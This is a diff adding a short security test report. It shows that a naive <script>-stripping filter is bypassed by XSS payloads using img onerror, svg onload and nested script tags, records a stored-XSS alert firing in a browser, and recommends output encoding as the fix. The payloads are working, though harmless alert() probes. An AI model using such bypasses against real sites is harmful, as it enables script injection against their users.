@@ -1,0 +1,12 @@
+### Bypass of naive <script>-stripping (self-contained proof)
+blocked  plain <script>   -> ""
+BYPASS   img onerror      -> "<img src=1 onerror=alert('x')>"
+BYPASS   svg onload       -> "<svg onload=alert('x')>"
+BYPASS   nested script    -> "<script>"
+
+3 of 4 payloads survive the denylist.
+Only output encoding (escape everything) is a real fix — see [FIX-XSS-S].
+
+### LIVE: <img onerror> comment survives the strip and fires in a browser
+   stored comment value: "<img src=1 onerror=alert('stored-bypass')>"
+   browser: ALERT FIRED with message: "stored-bypass"
